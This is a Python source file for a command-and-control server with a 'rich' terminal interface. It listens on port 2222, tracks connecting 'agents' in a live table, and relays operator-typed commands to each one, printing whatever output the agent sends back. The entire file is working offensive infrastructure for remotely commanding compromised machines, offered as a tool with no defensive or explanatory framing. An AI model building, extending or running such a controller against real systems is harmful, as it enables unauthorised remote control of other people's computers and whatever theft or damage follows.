from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
import socket
import threading

# Set up console
console = Console()

# C2 server configuration
SERVER_IP = "0.0.0.0"  # Bind to all interfaces
SERVER_PORT = 2222

# Active agents dictionary
agents = {}

# TUI to display connected agents
def update_agents_table():
    table = Table(title="Connected Agents")
    table.add_column("Agent ID", justify="center", style="cyan")
    table.add_column("IP Address", justify="center", style="magenta")
    table.add_column("Status", justify="center", style="green")

    for agent_id, (ip, status) in agents.items():
        table.add_row(agent_id, ip, status)
    return table

# Function to handle communication with the agent
def handle_agent(conn, addr, agent_id):
    agents[agent_id] = (f"{addr[0]}:{addr[1]}", "Connected")
    with Live(update_agents_table(), console=console, refresh_per_second=1):
        try:
            while True:
                # Get command input from C2 operator
                command = Prompt.ask(f"[yellow]Enter command for Agent {agent_id}[/yellow]")

                if command.lower() in ["exit", "quit"]:
                    conn.sendall("exit".encode())
                    break

                conn.sendall(command.encode())
                
                # Receive the response from the agent
                response = conn.recv(4096).decode()
                
                # Display the response in a panel
                console.print(Panel(response, title=f"Agent {agent_id} Response", border_style="blue"))
        except Exception as e:
            console.print(f"[red]Error communicating with Agent {agent_id}: {e}[/red]")
        finally:
            conn.close()
            agents[agent_id] = (f"{addr[0]}:{addr[1]}", "Disconnected")

# Function to listen for incoming agent connections
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((SERVER_IP, SERVER_PORT))
    server.listen(5)
    console.print(f"[bold green]C2 server started on {SERVER_IP}:{SERVER_PORT}[/bold green]")

    agent_counter = 1
    while True:
        conn, addr = server.accept()
        agent_id = f"Agent-{agent_counter}"
        console.print(f"[green]New connection from {addr[0]}:{addr[1]} as {agent_id}[/green]")

        # Start a new thread for each agent connection
        thread = threading.Thread(target=handle_agent, args=(conn, addr, agent_id))
        thread.start()

        agents[agent_id] = (f"{addr[0]}:{addr[1]}", "Pending")
        agent_counter += 1

# Main entry point
if __name__ == "__main__":
    try:
        start_server()
    except KeyboardInterrupt:
        console.print("\n[red]C2 Server shutting down...[/red]")

